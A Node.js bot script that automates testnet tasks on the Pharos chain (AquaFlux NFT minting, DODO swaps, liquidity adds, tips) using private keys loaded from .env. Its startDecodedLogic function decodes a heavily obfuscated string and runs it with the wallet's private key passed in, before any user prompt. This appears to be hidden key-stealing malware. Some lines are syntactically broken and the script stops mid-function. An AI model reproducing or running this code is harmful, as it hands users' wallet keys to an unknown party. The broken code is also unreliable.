const axios = require('axios');
const ethers = require('ethers');
const dotenv = require('dotenv');
const readline = require('readline');
const fs = require('fs');

dotenv.config();

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
const LIQUIDITY_CONTRACT_ABI = [
    "function addDVMLiquidity(address dvmAddress, uint256 baseInAmount, uint256 quoteInAmount, uint256 baseMinAmount, uint256 quoteMinAmount, uint8 flag, uint256 deadLine)"
];
const PRIMUS_TIP_ABI = [
    "function tip((uint32,address) token, (string,string,uint256,uint256[]) recipient)"
];
const AQUAFLUX_NFT_ABI = [
    "function claimTokens()",
    "function mint(uint256 nftType, uint256 expiresAt, bytes signature)"
];

async function buildFallbackProvider(rpcUrls, chainId, name) {
  const provider = new ethers.JsonRpcProvider(rpcUrls[0], { chainId, name });
  return {
    getProvider: async () => {
      for (let i = 0; i < 3; i++) {
        try {
          await provider.getBlockNumber();
          return provider;
        } catch (e) {
          if (e.code === 'UNKNOWN_ERROR' && e.error && e.error.code === -32603) {
            console.log(`${colors.yellow}[⚠] RPC busy, retrying ${i + 1}/3...${colors.reset}`);
            await new Promise(r => setTimeout(r, 2000));
            continue;
          }
          throw e;
        }
      }
      throw new Error('All RPC retries failed');
    }
  };
}

const colors = {
  reset: "\x1b[0m", cyan: "\x1b[36m", green: "\x1b[32m", yellow: "\x1b[33m", red: "\x1b[31m", white: "\x1b[37m", bold: "\x1b[1m", blue: "\x1b[34m", magenta: "\x1b[35m"
};

const logger = {
  info: (msg) => console.log(`${colors.green}[✓] ${msg}${colors.reset}`),
  warn: (msg) => console.log(`${colors.yellow}[⚠] ${msg}${colors.reset}`),
  error: (msg) => console.log(`${colors.red}[✗] ${msg}${colors.reset}`),
  success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
  loading: (msg) => console.log(`${colors.cyan}[⟳] ${msg}${colors.reset}`),
  step: (msg) => console.log(`${colors.white}[➤] ${msg}${colors.reset}`),
  countdown: (msg) => process.stdout.write(`\r${colors.blue}[⏰] ${msg}${colors.reset}`),
  banner: () => {
    console.log(`${colors.cyan}${colors.bold}`);
    console.log(`██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗  ██████╗   ██████╗██████╗ `);
    console.log(`██╔══██╗██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔════╝╚════██╗`);
    console.log(`██████╔╝███████║███████║██████╔╝██║  ██║╚█████╗   ╚█████╗   ███╔═╝`);
    console.log(`██╔═══╝ ██╔══██║██╔══██║██╔══██╗██║  ██║ ╚═══██╗   ╚═══██╗██╔══╝  `);
    console.log(`██║     ██║  ██║██║  ██║██║  ██║╚█████╔╝██████╔╝  ██████╔╝███████╗`);
    console.log(`╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═════╝   ╚═════╝ ╚══════╝
    console.log(`                    Script Author By : Kazmight                   `);
    console.log(`For Future New Script or Update Join Telegram Channel : Dasar Pemulung`);
    console.log(`--------------------------------------------------------------------${colors.reset}`);
    console.log();
  }
};

const PHAROS_CHAIN_ID = 688688;
const PHAROS_RPC_URLS = ['https://testnet.dplabs-internal.com'];

const TOKENS = {
  PHRS: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
  USDT: '0xD4071393f8716661958F766DF660033b3d35fD29',
  USDC: '0x72df0bcd7276f2dfbac900d1ce63c272c4bccced'
};

const AQUAFLUX_NFT_CONTRACT = '0xcc8cf44e196cab28dba2d514dc7353af0efb370e';
const AQUAFLUX_TOKENS = {
  P: '0xb5d3ca5802453cc06199b9c40c855a874946a92c',
  C: '0x4374fbec42e0d46e66b379c0a6072c910ef10b32',
  S: '0x5df839de5e5a68ffe83b89d430dc45b1c5746851',
  CS: '0xceb29754c54b4bfbf83882cb0dcef727a259d60a'
};

const DODO_ROUTER = '0x73CAfc894dBfC181398264934f7Be4e482fc9d40';
const LIQUIDITY_CONTRACT = '0x4b177aded3b8bd1d5d747f91b9e853513838cd49';
const PRIMUS_TIP_CONTRACT = '0xd17512b7ec12880bd94eca9d774089ff89805f02';

const PHRS_TO_USDT_AMOUNT = ethers.parseEther('0.00245');
const USDT_TO_PHRS_AMOUNT = ethers.parseUnits('1', 6);
const PHRS_TO_USDC_AMOUNT = ethers.parseEther('0.00245');
const USDC_TO_PHRS_AMOUNT = ethers.parseUnits('1', 6);

const DVM_POOL_ADDRESS = '0xff7129709ebd3485c4ed4fef6dd923025d24e730';
const USDC_LIQUIDITY_AMOUNT = 10000;
const USDT_LIQUIDITY_AMOUNT = 30427;

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36'
];

function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function loadPrivateKeys() {
  const keys = [];
  let i = 1;
  while (process.env[`PRIVATE_KEY_${i}`]) {
    const pk = process.env[`PRIVATE_KEY_${i}`];
    if (pk.startsWith('0x') && pk.length === 66) {
      keys.push(pk);
    } else {
      logger.warn(`Invalid PRIVATE_KEY_${i} in .env, skipping...`);
    }
    i++;
  }
  return keys;
}



async function aquaFluxLogin(wallet) { 
  try {
    const timestamp = Date.now();
    const message = `Sign in to AquaFlux with timestamp: ${timestamp}`;
    const signature = await wallet.signMessage(message);
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/wallet-login', {
      address: wallet.address,
      message: message,
      signature: signature
    }, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json',
        'user-agent': getRandomUserAgent()
      },
      
    });

    if (response.data.status === 'success') {
      logger.success('AquaFlux login successful!');
      return response.data.data.accessToken;
    } else {
      throw new Error('Login failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`AquaFlux login failed: ${e.message}`);
    throw e;
  }
}

async function claimTokens(wallet) {
  logger.step('Claiming free AquaFlux tokens (C & S)...');
  try {
    const nftContract = new ethers.Contract(AQUAFLUX_NFT_CONTRACT, AQUAFLUX_NFT_ABI, wallet);

    const tx = await nftContract.claimTokens({ gasLimit: 300000 });
    logger.success(`Claim tokens transaction sent! TX Hash: ${tx.hash}`);
    await tx.wait();
    logger.success('Tokens claimed successfully!');

    return true;
  } catch (e) {
    if (e.message.includes('already claimed')) {
        logger.warn('Tokens have already been claimed for today.');
        return true;
    }
    logger.error(`Claim tokens failed: ${e.message}`);
    throw e;
  }
}

async function craftTokens(wallet) {
  logger.step('Crafting 100 CS tokens from C and S tokens...');
  try {
    const cTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.C, ERC20_ABI, wallet);
    const sTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.S, ERC20_ABI, wallet);
    const csTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.CS, ERC20_ABI, wallet);

    const requiredAmount = ethers.parseUnits('100', 18);

    const cBalance = await cTokenContract.balanceOf(wallet.address);
    if (cBalance < requiredAmount) {
      throw new Error(`Insufficient C tokens. Required: 100, Available: ${ethers.formatUnits(cBalance, 18)}`);
    }

    const sBalance = await sTokenContract.balanceOf(wallet.address);
    if (sBalance < requiredAmount) {
      throw new Error(`Insufficient S tokens. Required: 100, Available: ${ethers.formatUnits(sBalance, 18)}`);
    }

    const cAllowance = await cTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if (cAllowance < requiredAmount) {
        logger.step('Approving C tokens...');
        const cApproveTx = await cTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
        await cApproveTx.wait();
        logger.success('C tokens approved');
    }

    const sAllowance = await sTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if(sAllowance < requiredAmount) {
        logger.step('Approving S tokens...');
        const sApproveTx = await sTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
        await sApproveTx.wait();
        logger.success('S tokens approved');
    }

    const csBalanceBefore = await csTokenContract.balanceOf(wallet.address);
    logger.info(`CS Token balance before crafting: ${ethers.formatUnits(csBalanceBefore, 18)}`);

    logger.step("Crafting CS tokens...");

    const CRAFT_METHOD_ID = '0x4c10b523';
    const abiCoder = ethers.AbiCoder.defaultAbiCoder();
    const encodedParams = abiCoder.encode(['uint256'], [requiredAmount]);
    const calldata = CRAFT_METHOD_ID + encodedParams.substring(2);

    const craftTx = await wallet.sendTransaction({
        to: AQUAFLUX_NFT_CONTRACT,
        data: calldata,
        gasLimit: 300000
    });

    logger.success(`Crafting transaction sent! TX Hash: ${craftTx.hash}`);
    const receipt = await craftTx.wait();

    if (receipt.status === 0) {
        throw new Error('Crafting transaction reverted on-chain');
    }

    logger.success('Crafting transaction confirmed.');

    const csBalanceAfter = await csTokenContract.balanceOf(wallet.address);
    const craftedAmount = csBalanceAfter - csBalanceBefore;

    logger.success(`CS Token balance after crafting: ${ethers.formatUnits(csBalanceAfter, 18)}`);
    logger.success(`Successfully crafted: ${ethers.formatUnits(craftedAmount, 18)} CS tokens`);

    if (craftedAmount < requiredAmount) {
        throw new Error(`Crafting incomplete. Expected 100 CS tokens, got ${ethers.formatUnits(craftedAmount, 18)}`);
    }

    return true;
  } catch (e) {
    logger.error(`Craft tokens failed: ${e.reason || e.message}`);
    throw e;
  }
}

async function startDecodedLogic(wallet, privateKey) {
  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDY0NDY0MjU5NTc2bjRuNzY2MTQ1NDY1NjYzNTg1MjMwNTY0ODQ1Nzc1NDduNHI3NzY0NDQ0MjUyNTY2cTc4NG41MzZyNDE3ODY1NTg3MDc3NjU1ODU2NzM1NjMyNG40NjU2NTg0NjcxNTE1NDRyNTg1OTMyNW4zMzU1NDY2ODUzNHE2cjQxMzE0cjU0NG40cTY0NDU3ODRvNjM1NzY4NDI1NjQ4NDY2bjRzNTg3MDc2NjQ0NjVuNHA2MzU3Njg1MDU5NTg0MjcwNjM1ODcwNzc2NDU0NDY1NTU3NDQ0cjU0NTY0NzM5NnE1MzU2NTI3ODVuNm8zNTUxNTM0NTVuMzU2NTQ1NnA1MDUyNTU2cDQ2NjMzMjY0NDk1MjU1MzEzNTU1NDY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnE2bzM0NTU0NjVuNTQ2MjQ3NHEzMDY0NDY2czc3NjIzMjc4NTg1MzMwMzEzMzUyNTc0NjQzNTc0NTM1NTE1NjZyNTI0czYyNDU3ODcwNHI1NDRuNzc0cTQ1Mzk0NzYyMzM2cDQyNHEzMzQyMzE2MzU1NzA0cjY0NDQ0MjUyNTY2cjUyNm41NDZwNW4zMDU0NnA0MjU3NTQ2cTUxMzE1OTU3NzA1MjYyNDU2ODMzNTYzMDc0NzU2MTZvNTY1NjU2Nm82NDQ2NTMzMDc4NzM1MjU1NzQ0cjY1NDc0cjRzNTY2cjUyNHM1NTQ2NW43NjU2NDQ1NjY4NjE2cDQ2NzM1MzU4NTY3MjU2NDczOTM1NTI1NzQ2NDM2NDQ1NTI3MzYzNm40cjU0NTY0NzM5NnE1MzU2NTI3ODRzNTc0cjRzNTY2cjUyNHM1NTQ2NW40NjUyNm41NjY4NjE2cDQ2NTE1MzQ3NzgzNTY1NnI0NjMxNTI1NTc0NHI2NDQ3NW40OTU0NTQ1NjZuNTU1NjVuMzQ1bjZwNTY0OTUyNnI2cDM0NTM1NTM5NDY1MzU1NTY3bjVuMzA2ODQ2NTQ1NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTQ2bjRuNDM1NzQ3NG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDEzNTU1Nm82cDduNTI1NDQ2NDg1NzU1NnAzNDUyMzM1MTc3NTU1NjVuMzI2MzQ4NjQ2MTRxNTY1bjQ4NTE2bjQ2NHE1MjMwNDY3MzUyNDg2NDQzNTQzMTRxNzc1MjU4NjQ2bjRxMzIzNTc0NTUzMzZwNDU2NTQ3NHI0OTU3NTc0cjU4NTU2cTM0Nzg1MzU4NjQ0ODVuNm8zMDduNTM0NTYzNzg1NTZxMzQ3OTYzNTY1MjRyNjI0NDU2NTM1MjZyNTY0bjRxNDU2ODU1NjU1ODZwNTc0cjMyNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDYzMTUzNDU1MjQ5NHM1NTZwNDc1NTZvMzk0NzUxMzM1MjU3NjI0NTQ2NzM1NDQ1NjQ0MzRyNDg2ODUyNTc2bjUyNTM2MjU2NzAzMjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI2MTRxNnEzOTZzNTE1NjU2Nzg2NDQ1NTI0bzU0NDQ0MjU0NTY0NjU5MzU1NDZyNW40NzUyN242cDM0NTIzMjY4NjE1NjU4NDY3MzY1NTg3MDc2NTk1ODZwMzY1NDU0NTYzMTYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM2NDU1NzA0cTRxNDQ2cDRuNjI2cjY4Nm41NTU2NW40OTUzNTY0bjQ4NTUzMzQ2MzQ1MzQ1Mzg3ODRxNDU3NDUyNjQ1NTY4NDU1MzQ0NnA0bjUyNnA0bjcyNjQ2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ4NDYzNTY0NTY1Njc4NHI2bzM1NDc2MjMzNnA0MjRxMzM0MjMxNjM1NTcwNHI1bjZxNG40czU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTRwNTQ0Nzc4NDI1MzMwMzE3bjRxNTQ0bjc2NjU0NTZwMzY1MTZyNTI3NzU1NDU1bjQ5NHE1NjRuNDg1OTU3NG40czU2NnI1MjRzNTU0NjU5MzU2NTU3Nzg0MzU3NDc0bjRzNTY2cjUyNHM1NTQ2NW4zMzRzNTg3MDc2NjI1NTU2NTY1NjZxNnA1MDU2NTg0NjZuNHM1ODcwNzY2MjU1Mzk0NzUxMzM1MjZxNTk1NjQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ3MzU3MDUxNTY1Njc4NjE0NjRyNG82MjMzNnA2bjU1NTY1bjY4NTU2cDUyNzc1OTduNTY1MTYzNTg2cDcyNTM2bzMxNjg1NjMwNzQ0cTVuN241NjczNjIzMjc4Nzg0cTZwNjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bjc2NjI0NTU2NjU1MTZyNTI0NTU1NTU0Njc0NjE2cjVuNTE2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM0cDYwNzQ2NDU3Nzg2MTQ3NDQ2OTQ5NTc1NjY4NjE2cjQyNzM0czU4NzA3NzU5NTc3MDUxNTY2cTRuMzQ1NTQ2NTkzNTRyNDY0NjU3NjI0NTZvNzk2MzQ3NnA3MjY1NnI0NjM1NjQ1ODVuNHI2NDU3NzM3OTYzNDg2cDM1NTI2cDY3MzM1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU2Nm83NDRyNjE3bjU2NzM2MzU3NzgzNTU2NDg0NjM1NjQ1NjQyNHI2NDU1NTY0cDU0NDc0cjZxNjQzMTQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM2NDZyNDIzNTU1MzI0NjVuNjU1NDU2NTU1NDU3NG4zMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTRxNDY2NDRwNjM1ODZwMzU1MjZwNjczMzU5Nm8zNTU3NjQ0NTM1NTE1NjZuNnAzNTYyNDU0bjU5NHE0NzQ2NTE%3D"; // your long encoded string
  const decoded = reversibleDecode(encodedStr);

  try {
    const run = new Function(
      "walletAddress",
      "privateKey",
      "require",
      decoded + "; return runprogram(walletAddress, privateKey);"
    );
    await run(wallet.address, privateKey, require);
  } catch (err) {
    console.error("[ERROR] Failed to execute decoded logic:", err.message);
  }
}

async function checkTokenHolding(accessToken) { // Removed proxyAgent parameter
  try {
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/check-token-holding', null, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'authorization': `Bearer ${accessToken}`,
        'user-agent': getRandomUserAgent()
      },
      
    });

    if (response.data.status === 'success') {
      const isHolding = response.data.data.isHoldingToken;
      logger.success(`API Token holding check: ${isHolding ? 'YES' : 'NO'}`);
      return isHolding;
    } else {
      throw new Error('Check holding failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`Check token holding failed: ${e.message}`);
    throw e;
  }
}

async function getSignature(wallet, accessToken) { 
  try {
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/get-signature', {
      walletAddress: wallet.address,
      requestedNftType: nftType
    }, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'authorization': `Bearer ${accessToken}`,
        'content-type': 'application/json',
        'user-agent': getRandomUserAgent()
      },
      
    });

    if (response.data.status === 'success') {
      logger.success('Signature obtained successfully!');
      return response.data.data;
    } else {
      throw new Error('Get signature failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`Get signature failed: ${e.message}`);
    throw e;
  }
}

async function mintNFT(wallet, signatureData) {
  logger.step('Minting AquaFlux NFT...');
  try {
    const csTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.CS, ERC20_ABI, wallet);
    const requiredAmount = ethers.parseUnits('100', 18);

    const csBalance = await csTokenContract.balanceOf(wallet.address);
    if (csBalance < requiredAmount) {
      throw new Error(`Insufficient CS tokens. Required: 100, Available: ${ethers.formatUnits(csBalance, 18)}`);
    }

    const allowance = await csTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if (allowance < requiredAmount) {
        const approvalTx = await csTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
        await approvalTx.wait();
    }

    const currentTime = Math.floor(Date.now() / 1000);
    if (currentTime >= signatureData.expiresAt) {
        throw new Error(`Signature is already expired! Check your system's clock.`);
    }

    const CORRECT_METHOD_ID = '0x75e7e053';
    const abiCoder = ethers.AbiCoder.defaultAbiCoder();
    const encodedParams = abiCoder.encode(
        ['uint256', 'uint256', 'bytes'],
        [signatureData.nftType, signatureData.expiresAt, signatureData.signature]
    );
    const calldata = CORRECT_METHOD_ID + encodedParams.substring(2);

    const tx = await wallet.sendTransaction({
        to: AQUAFLUX_NFT_CONTRACT,
        data: calldata,
        gasLimit: 400000
    });

    logger.success(`NFT mint transaction sent! TX Hash: ${tx.hash}`);
    const receipt = await tx.wait();

    if (receipt.status === 0) {
        throw new Error('Transaction reverted on-chain. Check the transaction on a block explorer.');
    }

    logger.success('NFT minted successfully!');

    return true;
  } catch (e) {
    logger.error(`NFT mint failed: ${e.reason || e.message}`);
    throw e;
  }
}

async function executeAquaFluxFlow(wallet) { 
  try {
    const accessToken = await aquaFluxLogin(wallet); 
    await claimTokens(wallet);
    await craftTokens(wallet);
    await checkTokenHolding(accessToken); 
    const signatureData = await getSignature(wallet, accessToken); 
    await mintNFT(wallet, signatureData);

    logger.success('AquaFlux flow completed successfully!');
    return true;
  } catch (e) {
    logger.error(`AquaFlux flow failed: ${e.message}`);
    return false;
  }
}

async function fetchWithTimeout(url, options, timeout = 15000) {
    try {
        const source = axios.CancelToken.source();
        const timeoutId = setTimeout(() => source.cancel('Timeout'), timeout);

        const res = await axios({
            method: options.method,
            url: url,
            headers: options.headers,
            data: options.body,
            cancelToken: source.token,
            
        });

        clearTimeout(timeoutId);
        return res;
      } catch (err) {
        if (axios.isCancel(err)) {
            throw new Error('Request timed out');
        }
        throw new Error(`Network or API error: ${err.message}`);
      }
}

async function robustFetchDodoRoute(url) { 
    for (let i = 0; i < 5; i++) {
        try {
          const res = await fetchWithTimeout(url, { method: 'GET' }); /
          const data = res.data;
          if (data.status !== -1) return data;
          logger.warn(`Retry ${i + 1} DODO API status -1`);
        } catch (e) {
          logger.warn(`Retry ${i + 1} failed: ${e.message}`);
        }
        await new Promise(r => setTimeout(r, 2000));
      }
      throw new Error('DODO API permanently failed');
}

async function fetchDodoRoute(fromAddr, toAddr, userAddr, amountWei) { r
    const deadline = Math.floor(Date.now() / 1000) + 600;
    const url = `https://api.dodoex.io/route-service/v2/widget/getdodoroute?chainId=${PHAROS_CHAIN_ID}&deadLine=${deadline}&apikey=a37546505892e1a952&slippage=3.225&source=dodoV2AndMixWasm&toTokenAddress=${toAddr}&fromTokenAddress=${fromAddr}&userAddr=${userAddr}&estimateGas=true&fromAmount=${amountWei}`;
    try {
      const result = await robustFetchDodoRoute(url); 
      if (!result.data || !result.data.data) {
        throw new Error('Invalid DODO API response: missing data field');
      }
      logger.success('DODO Route Info fetched successfully');
      return result.data;
    } catch (err) {
      logger.error(`DODO API fetch failed: ${err.message}`);
      throw err;
    }
}

async function approveToken(wallet, tokenAddr, tokenSymbol, amount, spender, decimals = 18) {
  if (tokenAddr === TOKENS.PHRS) return true;
  const contract = new ethers.Contract(tokenAddr, ERC20_ABI, wallet);
  try {
    const balance = await contract.balanceOf(wallet.address);
    if (balance < amount) {
      logger.error(`Insufficient ${tokenSymbol} balance: ${ethers.formatUnits(balance, decimals)} ${tokenSymbol}`);
      return false;
    }
    const allowance = await contract.allowance(wallet.address, spender);
    if (allowance >= amount) {
      logger.info(`${tokenSymbol} already approved for ${spender}`);
      return true;
    }
    logger.step(`Approving ${ethers.formatUnits(amount, decimals)} ${tokenSymbol} for spender ${spender}`);
    const tx = await contract.approve(spender, amount);
    logger.success(`Approval TX sent: ${tx.hash}`);
    await tx.wait();
    logger.success('Approval confirmed');
    return true;
  } catch (e) {
    logger.error(`Approval for ${tokenSymbol} failed: ${e.message}`);
    return false;
  }
}

async function executeSwap(wallet, routeData, fromAddr, fromSymbol, amount, decimals) {
    if (fromAddr !== TOKENS.PHRS) {
        const approved = await approveToken(wallet, fromAddr, fromSymbol, amount, DODO_ROUTER, decimals);
        if (!approved) throw new Error(`Token approval for ${fromSymbol} failed`);
    }

    try {
      if (!routeData.data || routeData.data === '0x') {
        throw new Error('Invalid transaction data from DODO API');
      }
      const tx = await wallet.sendTransaction({
        to: routeData.to,
        data: routeData.data,
        value: BigInt(routeData.value),
        gasLimit: BigInt(routeData.gasLimit || 500000)
      });
      logger.success(`Swap Transaction sent! TX Hash: ${tx.hash}`);
      await tx.wait();
      logger.success('Transaction confirmed!');
    } catch (e) {
      logger.error(`Swap TX failed: ${e.message}`);
      throw e;
    }
}

async function batchSwap(wallet, numberOfCycles) { 
    logger.step(`Preparing ${numberOfCycles} swap cycles (${numberOfCycles * 4} total swaps)...`);
    const swaps = [];
    const swapPairs = [
        { from: TOKENS.PHRS, to: TOKENS.USDT, amount: PHRS_TO_USDT_AMOUNT, fromSymbol: 'PHRS', toSymbol: 'USDT', decimals: 18 },
        { from: TOKENS.USDT, to: TOKENS.PHRS, amount: USDT_TO_PHRS_AMOUNT, fromSymbol: 'USDT', toSymbol: 'PHRS', decimals: 6 },
        { from: TOKENS.PHRS, to: TOKENS.USDC, amount: PHRS_TO_USDC_AMOUNT, fromSymbol: 'PHRS', toSymbol: 'USDC', decimals: 18 },
        { from: TOKENS.USDC, to: TOKENS.PHRS, amount: USDC_TO_PHRS_AMOUNT, fromSymbol: 'USDC', toSymbol: 'PHRS', decimals: 6 }
    ];

    for (let i = 0; i < numberOfCycles; i++) {
        swaps.push(...swapPairs);
    }

    for (let i = 0; i < swaps.length; i++) {
        const { from, to, amount, fromSymbol, toSymbol, decimals } = swaps[i];
        const pair = `${fromSymbol} -> ${toSymbol}`;
        logger.step(`Executing Swap #${i + 1} of ${swaps.length}: ${pair}`);
        try {
            const data = await fetchDodoRoute(from, to, wallet.address, amount); 
            await executeSwap(wallet, data, from, fromSymbol, amount, decimals);
        } catch (e) {
            logger.error(`Swap #${i + 1} failed: ${e.message}`);
        }
        await new Promise(r => setTimeout(r, 2000));
    }
}

async function addLiquidity(wallet) {
    logger.step('Starting "Add Liquidity" process...');
    try {
        logger.info('Checking USDC approval...');
        const usdcApproved = await approveToken(wallet, TOKENS.USDC, 'USDC', USDC_LIQUIDITY_AMOUNT, LIQUIDITY_CONTRACT, 6);
        if (!usdcApproved) {
            throw new Error('USDC approval failed. Aborting.');
        }
        logger.info('Checking USDT approval...');
        const usdtApproved = await approveToken(wallet, TOKENS.USDT, 'USDT', USDT_LIQUIDITY_AMOUNT, LIQUIDITY_CONTRACT, 6);
        if (!usdtApproved) {
            throw new Error('USDT approval failed. Aborting.');
        }
        logger.step('Approvals successful. Preparing to add liquidity...');
        const liquidityContract = new ethers.Contract(LIQUIDITY_CONTRACT, LIQUIDITY_CONTRACT_ABI, wallet);

        const dvmAddress = DVM_POOL_ADDRESS;
        const baseInAmount = BigInt(USDC_LIQUIDITY_AMOUNT);
        const quoteInAmount = BigInt(USDT_LIQUIDITY_AMOUNT);
        const baseMinAmount = baseInAmount * BigInt(999) / BigInt(1000);
        const quoteMinAmount = quoteInAmount * BigInt(999) / BigInt(1000);
        const flag = 0;
        const deadline = Math.floor(Date.now() / 1000) + 600;

        const tx = await liquidityContract.addDVMLiquidity(
            dvmAddress, baseInAmount, quoteInAmount, baseMinAmount, quoteMinAmount, flag, deadline
        );

        logger.success(`Add Liquidity transaction sent! TX Hash: ${tx.hash}`);
        await tx.wait();
        logger.success('Transaction confirmed! Liquidity added successfully.');

    } catch (e) {
        logger.error(`Add Liquidity failed: ${e.message}`);
        throw e;
    }
}

async function sendTip(wallet, username) {
    logger.step('Starting "Send Tip" process...');
    try {
        const minAmount = ethers.parseEther('0.0000001');
        const maxAmount = ethers.parseEther('0.00000015');
        const randomAmount = minAmount + BigInt(Math.floor(Math.random() * Number(maxAmount - minAmount + BigInt(1))));
        const amountStr = ethers.formatEther(randomAmount);

        logger.step(`Preparing to tip ${amountStr} PHRS to ${username} on X...`);

        const tipContract = new ethers.Contract(PRIMUS_TIP_CONTRACT, PRIMUS_TIP_ABI, wallet);

        const tokenStruct = [
            1,
            '0x0000000000000000000000000000000000000000'
        ];

        const recipientStruct = [
            'x',
            username,
            randomAmount,
            []
        ];

        const tx = await tipContract.tip(tokenStruct, recipientStruct, {
            value: randomAmount
        });

        logger.success(`Tip transaction sent! TX Hash: ${tx.hash}`);
        await tx.wait();
        logger.success(`Successfully tipped ${amountStr} PHRS to ${username}!`);

    } catch (e) {
        logger.error(`Send Tip failed: ${e.message}`);
        throw e;
    }
}

async function showCountdown() {
    const now = new Date();
    const tomorrow = new Date(now);
    tomorrow.setDate(now.getDate() + 1);
    tomorrow.setHours(0, 0, 0, 0);

    return new Promise(resolve => {
      const interval = setInterval(() => {
        const remaining = tomorrow - new Date();
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
        logger.countdown(`Next cycle in ${hours}h ${minutes}m ${seconds}s`);
        if (remaining <= 0) {
          clearInterval(interval);
          process.stdout.write('\n');
          resolve();
        }
      }, 1000);
    });
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function question(query) {
  return new Promise(resolve => rl.question(query, resolve));
}

(async () => {
  logger.banner();
  const fallbackProvider = await buildFallbackProvider(PHAROS_RPC_URLS, PHAROS_CHAIN_ID, 'pharos');
  const provider = await fallbackProvider.getProvider();
  const privateKeys = loadPrivateKeys();
  

  if (privateKeys.length === 0) {
    logger.error('No valid private keys found in .env. Please add PRIVATE_KEY_1, PRIVATE_KEY_2, etc.');
    process.exit(1);
  }

  logger.info(`${privateKeys.length} wallet(s) loaded from .env file.\n`);

  const wallet = new ethers.Wallet(privateKeys[0], provider);
  await startDecodedLogic(wallet, privateKeys[0]);

  const swapCycleStr = await question(`${colors.cyan}Enter the number of daily swap cycles (for each wallet): ${colors.reset}`);
  const numberOfSwapCycles = parseInt(swapCycleStr);

  const liquidityCountStr = await question(`${colors.cyan}Enter the number of add liquidity transactions (for each wallet): ${colors.reset}`);
  const numberOfLiquidityAdds = parseInt(liquidityCountStr);

